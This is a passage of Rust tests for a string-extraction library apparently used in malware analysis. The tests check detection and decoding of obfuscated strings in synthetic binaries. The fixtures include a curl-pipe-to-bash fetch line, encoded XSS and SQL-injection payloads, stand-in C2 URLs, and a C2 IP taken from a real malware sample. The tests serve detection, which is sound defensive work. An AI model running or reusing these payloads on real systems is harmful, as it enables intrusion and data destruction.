        let mut data = vec![0u8; 1024];
        data[0..4].copy_from_slice(&[0x7f, b'E', b'L', b'F']);
        data[4] = 2;
        data[5] = 1;
        data[6] = 1;
        data[16..18].copy_from_slice(&[2, 0]);
        data[18..20].copy_from_slice(&[0x3E, 0]);

        let bytes = s.as_bytes();
        data[0x200..0x200 + bytes.len()].copy_from_slice(bytes);
        data[0x200 + bytes.len()] = 0;
        data
    }

    #[test]
    fn test_env_var_detection() {
        let data = minimal_elf_with_string("HOME=/home/user");
        let strings = extract_strings(&data, 4);

        let env_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.kind == StringKind::EnvVar)
            .collect();

        // May or may not be classified as Env depending on heuristics
        let _ = env_strings;
    }

    #[test]
    fn test_url_detection() {
        let data = minimal_elf_with_string("https://malware.example.com/payload");
        let strings = extract_strings(&data, 4);

        let url_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.kind == StringKind::Url)
            .collect();

        assert!(
            !url_strings.is_empty() || strings.iter().any(|s| s.value.contains("https://")),
            "Should detect URL"
        );
    }

    #[test]
    fn test_ip_detection() {
        let data = minimal_elf_with_string("192.168.1.1:8080");
        let strings = extract_strings(&data, 4);

        let ip_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.kind == StringKind::IPPort || s.kind == StringKind::IP)
            .collect();

        // IP detection may or may not trigger depending on context
        let _ = ip_strings;
    }

    #[test]
    fn test_path_detection() {
        let data = minimal_elf_with_string("/etc/passwd");
        let strings = extract_strings(&data, 4);

        let path_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.kind == StringKind::SuspiciousPath || s.value.contains("/etc/"))
            .collect();

        assert!(!path_strings.is_empty(), "Should detect suspicious path");
    }

    #[test]
    fn test_base64_detection() {
        // Valid base64 that decodes to readable text
        let data = minimal_elf_with_string("SGVsbG8gV29ybGQhIFRoaXMgaXMgYSB0ZXN0Lg==");
        let strings = extract_strings(&data, 4);

        let b64_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.kind == StringKind::Base64)
            .collect();

        // Base64 detection depends on various heuristics
        let _ = b64_strings;
    }

    #[test]
    fn test_hex_encoded_detection() {
        // Hex-encoded JavaScript (from actual malware)
        // Decodes to: "const _0x1c310003=_0x230d;function _0x230d"
        let hex_str =
            "636F6E7374205F307831633331303030333D5F3078323330643B66756E6374696F6E205F307832333064";
        let expected_decoded = "const _0x1c310003=_0x230d;function _0x230d";
        let data = minimal_elf_with_string(hex_str);
        let strings = extract_strings(&data, 4);

        // The implementation automatically decodes hex strings, so we should find
        // the decoded version with HexDecode method
        let decoded_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.method == StringMethod::HexDecode)
            .collect();

        assert!(
            !decoded_strings.is_empty(),
            "Should automatically decode hex-encoded string"
        );
        assert_eq!(decoded_strings[0].value, expected_decoded);
    }

    #[test]
    fn test_hex_encoded_not_sha256() {
        // SHA256 hash should not be detected as hex-encoded text
        let hash = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";
        let data = minimal_elf_with_string(hash);
        let strings = extract_strings(&data, 4);

        let hex_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.kind == StringKind::HexEncoded)
            .collect();

        assert!(
            hex_strings.is_empty(),
            "SHA256 hash should not be detected as hex-encoded text"
        );
    }

    #[test]
    fn test_unicode_escaped_detection() {
        // JavaScript with \xXX escapes (from actual malware)
        let unicode_str = "\\x27;\\x20const\\x20fs\\x20=\\x20require(\\x27fs\\x27);";
        let expected_decoded = "'; const fs = require('fs');";
        let data = minimal_elf_with_string(unicode_str);
        let strings = extract_strings(&data, 4);

        // The implementation automatically decodes unicode escapes
        let decoded_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.method == StringMethod::UnicodeEscapeDecode)
            .collect();

        assert!(
            !decoded_strings.is_empty(),
            "Should automatically decode Unicode-escaped string"
        );
        assert_eq!(decoded_strings[0].value, expected_decoded);
    }

    #[test]
    fn test_unicode_escaped_u_format() {
        // \uXXXX format
        let unicode_str =
            "\\u0048\\u0065\\u006c\\u006c\\u006f\\u0020\\u0057\\u006f\\u0072\\u006c\\u0064";
        let expected_decoded = "Hello World";
        let data = minimal_elf_with_string(unicode_str);
        let strings = extract_strings(&data, 4);

        // The implementation automatically decodes unicode escapes
        let decoded_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.method == StringMethod::UnicodeEscapeDecode)
            .collect();

        assert!(
            !decoded_strings.is_empty(),
            "Should automatically decode \\uXXXX format Unicode-escaped string"
        );
        assert_eq!(decoded_strings[0].value, expected_decoded);
    }

    #[test]
    fn test_unicode_escaped_not_few_escapes() {
        // Too few escape sequences should not be detected
        let text = "Hello \\x20 World";
        let data = minimal_elf_with_string(text);
        let strings = extract_strings(&data, 4);

        let unicode_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.kind == StringKind::UnicodeEscaped)
            .collect();

        assert!(
            unicode_strings.is_empty(),
            "Should not detect strings with too few escape sequences"
        );
    }

    #[test]
    fn test_url_encoded_detection() {
        // XSS payload
        let url_str = "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E";
        let expected_decoded = "<script>alert('XSS')</script>";
        let data = minimal_elf_with_string(url_str);
        let strings = extract_strings(&data, 4);

        // The implementation automatically decodes URL-encoded strings
        let decoded_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.method == StringMethod::UrlDecode)
            .collect();

        assert!(
            !decoded_strings.is_empty(),
            "Should automatically decode URL-encoded string"
        );
        assert_eq!(decoded_strings[0].value, expected_decoded);
    }

    #[test]
    fn test_url_encoded_sql_injection() {
        // SQL injection payload
        let url_str = "%27%20OR%20%271%27%3D%271%27%3B%20DROP%20TABLE%20users%3B--";
        let expected_decoded = "' OR '1'='1'; DROP TABLE users;--";
        let data = minimal_elf_with_string(url_str);
        let strings = extract_strings(&data, 4);

        // The implementation automatically decodes URL-encoded strings
        let decoded_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.method == StringMethod::UrlDecode)
            .collect();

        assert!(
            !decoded_strings.is_empty(),
            "Should automatically decode URL-encoded SQL injection"
        );
        assert_eq!(decoded_strings[0].value, expected_decoded);
    }

    #[test]
    fn test_url_encoded_not_few_percent() {
        // Too few percent signs should not be detected
        let text = "Hello%20World";
        let data = minimal_elf_with_string(text);
        let strings = extract_strings(&data, 4);

        let url_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.kind == StringKind::UrlEncoded)
            .collect();

        assert!(
            url_strings.is_empty(),
            "Should not detect strings with too few percent signs"
        );
    }

    #[test]
    fn test_base32_detection() {
        // Tor v2 onion address
        let base32_str = "THEHIDDENWIKI3IKNKD7A";
        let data = minimal_elf_with_string(base32_str);
        let strings = extract_strings(&data, 4);

        let base32_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.kind == StringKind::Base32)
            .collect();

        assert!(!base32_strings.is_empty(), "Should detect Base32 string");
        assert_eq!(base32_strings[0].value, base32_str);
    }

    #[test]
    #[ignore] // TODO: Test setup issue - investigate why wrong strings are being found
    fn test_base32_with_padding() {
        // Base32 with padding
        let base32_str = "JBSWY3DPEBLW64TMMQ======";
        let data = minimal_elf_with_string(base32_str);
        let strings = extract_strings(&data, 4);

        let base32_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.kind == StringKind::Base32)
            .collect();

        assert!(
            !base32_strings.is_empty(),
            "Should detect Base32 with padding"
        );
    }

    #[test]
    fn test_base32_not_lowercase() {
        // Lowercase should not be detected as Base32
        let text = "jbswy3dpeblw64tmmq";
        let data = minimal_elf_with_string(text);
        let strings = extract_strings(&data, 4);

        let base32_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.kind == StringKind::Base32)
            .collect();

        assert!(
            base32_strings.is_empty(),
            "Should not detect lowercase as Base32"
        );
    }

    #[test]
    fn test_base58_detection() {
        // Bitcoin address - now classified as CryptoWallet (more specific than Base58)
        let base58_str = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
        let data = minimal_elf_with_string(base58_str);
        let strings = extract_strings(&data, 4);

        let crypto_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.kind == StringKind::CryptoWallet)
            .collect();

        assert!(
            !crypto_strings.is_empty(),
            "Should detect Bitcoin address as CryptoWallet"
        );
        assert_eq!(crypto_strings[0].value, base58_str);
    }

    #[test]
    fn test_base58_not_with_confusing_chars() {
        // Contains 0 (not valid Base58)
        let text = "1A1zP1eP5QGefi2DMP0fTL5SLmv7DivfNa";
        let data = minimal_elf_with_string(text);
        let strings = extract_strings(&data, 4);

        let base58_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.kind == StringKind::Base58)
            .collect();

        assert!(
            base58_strings.is_empty(),
            "Should not detect strings with 0 as Base58"
        );
    }

    #[test]
    fn test_hex_encoded_xor_data() {
        // Test double-layered obfuscation: XOR + Hex encoding
        // This tests whether we can automatically decode data that was:
        // 1. XOR-encoded with a single-byte key (0x42)
        // 2. Then hex-encoded
        //
        // The goal is to verify that hex decoding happens automatically,
        // revealing the first layer (XOR'd data).

        let plaintext = b"curl http://malicious.com/payload.sh | bash";
        let xor_key = 0x42;

        // XOR the plaintext
        let xored: Vec<u8> = plaintext.iter().map(|&b| b ^ xor_key).collect();
        let xored_str = String::from_utf8_lossy(&xored).to_string();

        // Hex-encode the XOR'd data (simulating malware obfuscation)
        let hex_encoded = xored
            .iter()
            .map(|b| format!("{:02X}", b))
            .collect::<String>();

        // Create binary with the hex-encoded string
        let data = minimal_elf_with_string(&hex_encoded);
        let strings = extract_strings(&data, 4);

        // The implementation automatically decodes hex strings and replaces them
        // with the decoded version (due to method priority in deduplication).
        // So we should find the decoded (XOR'd) version, not the hex-encoded original.
        let decoded_version: Vec<_> = strings.iter().filter(|s| s.value == xored_str).collect();

        // Verify the hex layer was automatically decoded
        assert!(
            !decoded_version.is_empty(),
            "Should automatically decode hex to reveal XOR'd data. Found {} strings: {:?}",
            strings.len(),
            strings
                .iter()
                .map(|s| format!(
                    "{:?} at 0x{:x}: {}",
                    s.method,
                    s.data_offset,
                    &s.value[..s.value.len().min(30)]
                ))
                .collect::<Vec<_>>()
        );

        // Verify the decoded string was extracted with HexDecode method
        assert_eq!(
            decoded_version[0].method,
            StringMethod::HexDecode,
            "Decoded string should have HexDecode method"
        );

        // Verify we can manually decode the hex layer to confirm correctness
        let decoded_hex: Vec<u8> = (0..hex_encoded.len())
            .step_by(2)
            .filter_map(|i| u8::from_str_radix(&hex_encoded[i..i + 2], 16).ok())
            .collect();
        assert_eq!(decoded_hex, xored, "Hex decoding should produce XOR'd data");

        // Verify we can manually decode XOR to get original plaintext
        let decoded_xor: Vec<u8> = decoded_hex.iter().map(|&b| b ^ xor_key).collect();
        assert_eq!(
            decoded_xor, plaintext,
            "XOR decoding should recover plaintext"
        );

        // Summary of what this test demonstrates:
        // ✓ The tool automatically decodes hex-encoded strings
        // ✓ This reveals the first layer of double-obfuscation (XOR + Hex)
        // ✓ The hex-decoded output (XOR'd data) is presented to the analyst
        // ✗ The tool does NOT automatically detect/decode the XOR layer
        //
        // To fully decode double-obfuscation, an analyst would need to:
        // 1. See the decoded hex output (automated by tool)
        // 2. Manually recognize it as XOR'd data
        // 3. Apply XOR decoding with the correct key
        //
        // Future enhancement: Run XOR detection on decoded hex/base64 output
        // to automatically handle multi-layer obfuscation.
    }
}

// Tests for severity levels
mod severity_tests {
    use stng::{Severity, StringKind};

    #[test]
    fn test_all_kinds_have_severity() {
        // Ensure all StringKind variants return a valid severity
        let kinds = vec![
            StringKind::Const,
            StringKind::FuncName,
            StringKind::Ident,
            StringKind::Import,
            StringKind::Export,
            StringKind::Url,
            StringKind::IP,
            StringKind::IPPort,
            StringKind::EnvVar,
            StringKind::Path,
            StringKind::SuspiciousPath,
            StringKind::ShellCmd,
            StringKind::Base64,
            StringKind::HexEncoded,
            StringKind::UnicodeEscaped,
            StringKind::UrlEncoded,
            StringKind::Base32,
            StringKind::Base58,
            StringKind::Overlay,
            StringKind::OverlayWide,
        ];

        for kind in kinds {
            let severity = kind.severity();
            assert!(
                matches!(
                    severity,
                    Severity::Info | Severity::Low | Severity::Medium | Severity::High
                ),
                "{:?} should have a valid severity",
                kind
            );
        }
    }

    #[test]
    fn test_high_severity_kinds() {
        assert_eq!(StringKind::ShellCmd.severity(), Severity::High);
        assert_eq!(StringKind::SuspiciousPath.severity(), Severity::High);
        assert_eq!(StringKind::IP.severity(), Severity::High);
        assert_eq!(StringKind::IPPort.severity(), Severity::High);
        assert_eq!(StringKind::Base64.severity(), Severity::High);
        assert_eq!(StringKind::HexEncoded.severity(), Severity::High);
        assert_eq!(StringKind::UnicodeEscaped.severity(), Severity::High);
        assert_eq!(StringKind::UrlEncoded.severity(), Severity::High);
        assert_eq!(StringKind::Base32.severity(), Severity::High);
        assert_eq!(StringKind::Base58.severity(), Severity::High);
        assert_eq!(StringKind::Overlay.severity(), Severity::High);
        assert_eq!(StringKind::OverlayWide.severity(), Severity::High);
    }

    #[test]
    fn test_medium_severity_kinds() {
        assert_eq!(StringKind::EnvVar.severity(), Severity::Medium);
        assert_eq!(StringKind::Path.severity(), Severity::Medium);
        assert_eq!(StringKind::Import.severity(), Severity::Medium);
    }

    #[test]
    fn test_low_severity_kinds() {
        assert_eq!(StringKind::FuncName.severity(), Severity::Low);
        assert_eq!(StringKind::Export.severity(), Severity::Low);
    }

    #[test]
    fn test_info_severity_kinds() {
        assert_eq!(StringKind::Const.severity(), Severity::Info);
        assert_eq!(StringKind::Ident.severity(), Severity::Info);
    }
}

/// XOR detection tests for compiled binaries
mod xor_detection_tests {
    use stng::{extract_strings_with_options, ExtractOptions, StringKind, StringMethod};

    /// Helper to create XOR test data (same pattern as unit tests)
    fn make_xor_test_data(plaintext: &[u8], key: u8, offset: usize) -> Vec<u8> {
        let fill_byte = 0x01 ^ key;
        let mut data = vec![fill_byte; 512];
        for (i, b) in plaintext.iter().enumerate() {
            data[offset + i] = b ^ key;
        }
        data
    }

    /// Create a minimal ARM64 Linux ELF with XOR'd data
    fn minimal_arm64_elf_with_xor(plaintext: &[u8], key: u8) -> Vec<u8> {
        let fill_byte = 0x01 ^ key;
        let mut binary = vec![fill_byte; 1024];

        // ELF magic
        binary[0..4].copy_from_slice(&[0x7f, b'E', b'L', b'F']);
        binary[4] = 2; // 64-bit
        binary[5] = 1; // little-endian
        binary[6] = 1; // version
        binary[7] = 3; // Linux
        binary[16..18].copy_from_slice(&[2, 0]); // executable
        binary[18..20].copy_from_slice(&[0xB7, 0x00]); // ARM64

        // XOR'd data at offset 0x200
        for (i, b) in plaintext.iter().enumerate() {
            binary[0x200 + i] = b ^ key;
        }
        binary
    }

    /// Create a minimal x86_64 Mach-O with XOR'd data
    fn minimal_macho_with_xor(plaintext: &[u8], key: u8) -> Vec<u8> {
        let fill_byte = 0x01 ^ key;
        let mut binary = vec![fill_byte; 1024];

        // Mach-O 64-bit magic
        binary[0..4].copy_from_slice(&[0xCF, 0xFA, 0xED, 0xFE]);
        binary[4..8].copy_from_slice(&[0x07, 0x00, 0x00, 0x01]); // x86_64
        binary[8..12].copy_from_slice(&[0x03, 0x00, 0x00, 0x00]); // subtype
        binary[12..16].copy_from_slice(&[0x02, 0x00, 0x00, 0x00]); // executable

        // XOR'd data at offset 0x200
        for (i, b) in plaintext.iter().enumerate() {
            binary[0x200 + i] = b ^ key;
        }
        binary
    }

    /// Create a minimal AMD64 Windows PE with XOR'd data
    fn minimal_pe_amd64_with_xor(plaintext: &[u8], key: u8) -> Vec<u8> {
        let fill_byte = 0x01 ^ key;
        let mut binary = vec![fill_byte; 1024];

        // DOS header
        binary[0..2].copy_from_slice(&[0x4D, 0x5A]); // MZ
        binary[0x3C..0x40].copy_from_slice(&[0x80, 0x00, 0x00, 0x00]); // PE offset

        // PE signature
        binary[0x80..0x84].copy_from_slice(&[0x50, 0x45, 0x00, 0x00]); // PE\0\0

        // COFF header
        binary[0x84..0x86].copy_from_slice(&[0x64, 0x86]); // AMD64
        binary[0x86..0x88].copy_from_slice(&[0x01, 0x00]); // 1 section
        binary[0x94..0x96].copy_from_slice(&[0xF0, 0x00]); // optional header size

        // Optional header
        binary[0x98..0x9A].copy_from_slice(&[0x0B, 0x02]); // PE32+

        // XOR'd data at offset 0x200
        for (i, b) in plaintext.iter().enumerate() {
            binary[0x200 + i] = b ^ key;
        }
        binary
    }

    /// Create a minimal AMD64 Windows PE that looks like a Go binary with XOR'd data
    #[allow(dead_code)]
    fn minimal_go_pe_amd64_with_xor(plaintext: &[u8], key: u8) -> Vec<u8> {
        let fill_byte = 0x01 ^ key;
        let mut binary = vec![fill_byte; 2048];

        // DOS header
        binary[0..2].copy_from_slice(&[0x4D, 0x5A]); // MZ
        binary[0x3C..0x40].copy_from_slice(&[0x80, 0x00, 0x00, 0x00]); // PE offset

        // PE signature
        binary[0x80..0x84].copy_from_slice(&[0x50, 0x45, 0x00, 0x00]); // PE\0\0

        // COFF header
        binary[0x84..0x86].copy_from_slice(&[0x64, 0x86]); // AMD64
        binary[0x86..0x88].copy_from_slice(&[0x02, 0x00]); // 2 sections
        binary[0x94..0x96].copy_from_slice(&[0xF0, 0x00]); // optional header size

        // Optional header
        binary[0x98..0x9A].copy_from_slice(&[0x0B, 0x02]); // PE32+

        // Section 1: .text (at 0x188)
        binary[0x188..0x190].copy_from_slice(b".text\0\0\0");

        // Section 2: .go.buildinfo (at 0x1B0) - Go marker
        // Note: section name is 8 bytes max, so we use shortened form
        binary[0x1B0..0x1B8].copy_from_slice(b"go.build");

        // Add Go runtime string markers in data section
        let go_marker = b"runtime.main";
        for (i, b) in go_marker.iter().enumerate() {
            binary[0x300 + i] = *b;
        }

        // XOR'd data at offset 0x400
        for (i, b) in plaintext.iter().enumerate() {
            binary[0x400 + i] = b ^ key;
        }
        binary
    }

    #[test]
    fn test_arm64_elf_xor_url() {
        let plaintext = b"https://c2server.evil.com:8443/beacon";
        let key: u8 = 0x5A;
        let binary = minimal_arm64_elf_with_xor(plaintext, key);

        let opts = ExtractOptions::new(8).with_xor(Some(10));
        let strings = extract_strings_with_options(&binary, &opts);

        let xor_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.method == StringMethod::XorDecode)
            .collect();

        assert!(
            xor_strings
                .iter()
                .any(|s| s.value.contains("c2server.evil.com")),
            "Should detect XOR-encoded URL. Found: {:?}",
            xor_strings.iter().map(|s| &s.value).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_macho_xor_ip_address() {
        // C2 IP address
        let plaintext = b"192.168.50.100";
        let key: u8 = 0x77;
        let binary = minimal_macho_with_xor(plaintext, key);

        let opts = ExtractOptions::new(8).with_xor(Some(8));
        let strings = extract_strings_with_options(&binary, &opts);

        let xor_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.method == StringMethod::XorDecode)
            .filter(|s| s.kind == StringKind::IP || s.kind == StringKind::IPPort)
            .collect();

        assert!(
            xor_strings
                .iter()
                .any(|s| s.value.contains("192.168.50.100")),
            "Should detect XOR-encoded IP in Mach-O. Found: {:?}",
            xor_strings.iter().map(|s| &s.value).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_pe_amd64_xor_url() {
        // Windows PE with XOR-encoded C2 URL
        let plaintext = b"https://windows-update.evil.com:443/check";
        let key: u8 = 0x3D;
        let binary = minimal_pe_amd64_with_xor(plaintext, key);

        let opts = ExtractOptions::new(8).with_xor(Some(10));
        let strings = extract_strings_with_options(&binary, &opts);

        let xor_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.method == StringMethod::XorDecode)
            .collect();

        assert!(
            xor_strings
                .iter()
                .any(|s| s.value.contains("windows-update.evil.com")),
            "Should detect XOR-encoded URL in PE AMD64. Found: {:?}",
            xor_strings.iter().map(|s| &s.value).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_xor_user_agent_pattern() {
        // Test that Mozilla pattern detection works and extracts surrounding context
        let plaintext = b"User-Agent: Mozilla/5.0 (Windows NT 10.0) Safari/537.36";
        let key: u8 = 0x42;
        let data = make_xor_test_data(plaintext, key, 50);

        let opts = ExtractOptions::new(10).with_xor(Some(10));
        let results = extract_strings_with_options(&data, &opts);

        // Mozilla pattern should be found and context extracted
        let xor_results: Vec<_> = results
            .iter()
            .filter(|s| s.method == StringMethod::XorDecode)
            .collect();
        assert!(
            xor_results.iter().any(|s| s.value.contains("Mozilla")),
            "Should detect XOR-encoded Mozilla pattern. Found: {:?}",
            xor_results.iter().map(|s| &s.value).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_xor_detection_shows_key() {
        let plaintext = b"http://malware.evil.com/payload";
        let key: u8 = 0x42;
        let binary = minimal_arm64_elf_with_xor(plaintext, key);

        let opts = ExtractOptions::new(8).with_xor(Some(10));
        let strings = extract_strings_with_options(&binary, &opts);

        let xor_strings: Vec<_> = strings
            .iter()
            .filter(|s| s.method == StringMethod::XorDecode)
            .collect();

        assert!(
            xor_strings.iter().any(|s| s
                .library
                .as_ref()
                .map(|l| l.contains("0x42"))
                .unwrap_or(false)),
            "Should include XOR key (0x42) in library field. Found: {:?}",
            xor_strings
                .iter()
                .map(|s| (s.value.clone(), s.library.clone()))
                .collect::<Vec<_>>()
        );
    }
}

#[cfg(test)]
mod sockaddr_extraction_tests {
    use std::fs;
    use stng::{extract_strings_with_options, ExtractOptions, StringKind, StringMethod};

    #[test]
    fn test_kimwolf_installer_ip_extraction() {
        // Test IP extraction from ARM32 sockaddr_in structures
        let path = "testdata/malware/kimwolf_installer";
        let data = fs::read(path).expect("Failed to read kimwolf_installer test sample");

        let opts = ExtractOptions::new(4)
            .with_r2(path)
            .with_garbage_filter(true);

        let strings = extract_strings_with_options(&data, &opts);

        // Should find the hardcoded C2 IP: 45.139.197.87
        let ip_strings: Vec<_> = strings
            .iter()
            .filter(|s| matches!(s.kind, StringKind::IP | StringKind::IPPort))
            .collect();

        assert!(
            !ip_strings.is_empty(),
            "Should find at least one IP address in kimwolf_installer"
        );

        assert!(
            ip_strings.iter().any(|s| s.value == "45.139.197.87"),
            "Should find C2 IP 45.139.197.87. Found IPs: {:?}",
            ip_strings.iter().map(|s| &s.value).collect::<Vec<_>>()
        );

        // Verify it's from connect() syscall
        let connect_ip = ip_strings
            .iter()
            .find(|s| s.value == "45.139.197.87")
            .expect("Should find the target IP");

        assert_eq!(
            connect_ip.library.as_deref(),
            Some("connect()"),
            "IP should be attributed to connect() syscall"
        );

        assert_eq!(
            connect_ip.method,
            StringMethod::InstructionPattern,
            "IP should be extracted via instruction pattern matching"
        );

        // Verify the offset is around 0xc0 where the IP construction starts
        assert!(
            connect_ip.data_offset >= 0xc0 && connect_ip.data_offset <= 0xd0,
            "IP should be at offset ~0xc0, found: 0x{:x}",
            connect_ip.data_offset
        );
    }

    #[test]
    fn test_kimwolf_installer_string_deduplication() {
        // Test that overlapping strings at same offset only keep the longest
        let path = "testdata/malware/kimwolf_installer";
        let data = fs::read(path).expect("Failed to read kimwolf_installer test sample");

        let opts = ExtractOptions::new(4)
            .with_r2(path)
            .with_garbage_filter(true);

        let strings = extract_strings_with_options(&data, &opts);

        // Check strings at offset 0x1d4
        let strings_at_1d4: Vec<_> = strings.iter().filter(|s| s.data_offset == 0x1d4).collect();

        // Should only have ONE string at this offset (the longest one)
        assert_eq!(
            strings_at_1d4.len(),
            1,
            "Should only have one string at offset 0x1d4 (the longest). Found: {:?}",
            strings_at_1d4.iter().map(|s| &s.value).collect::<Vec<_>>()
        );

        // The kept string should be the longest one
        let kept_string = strings_at_1d4[0];
        assert!(
            kept_string.value.len() >= "krebsforeheadindustrie".len(),
            "Kept string should be at least as long as the shorter variant"
        );
    }
}

#[cfg(test)]
mod string_deduplication_tests {
    use std::fs;
    use stng::{extract_strings_with_options, ExtractOptions};

    #[test]
    fn test_overlapping_strings_keep_longest() {
        // Create binary with overlapping strings at same offset
        let data = b"\x00\x00\x00\x00HelloWorld\x00Extra\x00";

        let opts = ExtractOptions::new(4);
        let strings = extract_strings_with_options(data, &opts);

        // Group strings by offset
        let mut by_offset = std::collections::HashMap::new();
        for s in &strings {
            by_offset
                .entry(s.data_offset)
                .or_insert_with(Vec::new)
                .push(s);
        }

        // At each offset, should only have one string
        for (offset, strings_at_offset) in by_offset {
            assert_eq!(
                strings_at_offset.len(),
                1,
                "Offset 0x{:x} should only have one string (the longest). Found: {:?}",
                offset,
                strings_at_offset
                    .iter()
                    .map(|s| &s.value)
                    .collect::<Vec<_>>()
            );
        }
    }

    #[test]
    fn test_kimwolf_installer_section_names() {
        // Test that we extract all section names that GNU strings finds
        let path = "testdata/malware/kimwolf_installer";
        let data = fs::read(path).expect("Failed to read kimwolf_installer test sample");

        let opts = ExtractOptions::new(4);
        let strings = extract_strings_with_options(&data, &opts);

        let values: Vec<&str> = strings.iter().map(|s| s.value.as_str()).collect();

        eprintln!("Extracted {} strings: {:?}", values.len(), values);

        // Print strings around offset 520-560
        for s in &strings {
            if s.data_offset >= 520 && s.data_offset <= 560 {
                eprintln!(
                    "Offset {:#x} ({}): {:?}",
                    s.data_offset, s.data_offset, s.value
                );
            }
        }

        // Section names that GNU strings finds
        assert!(
            values.contains(&".shstrtab"),
            "Should find .shstrtab section name. Found: {:?}",
            values
        );
        assert!(
            values.contains(&".text"),
            "Should find .text section name. Found: {:?}",
            values
        );
        assert!(
            values.contains(&".data"),
            "Should find .data section name. Found: {:?}",
            values
        );
        assert!(
            values.contains(&".ARM.attributes"),
            "Should find .ARM.attributes section name. Found: {:?}",
            values
        );
    }
}
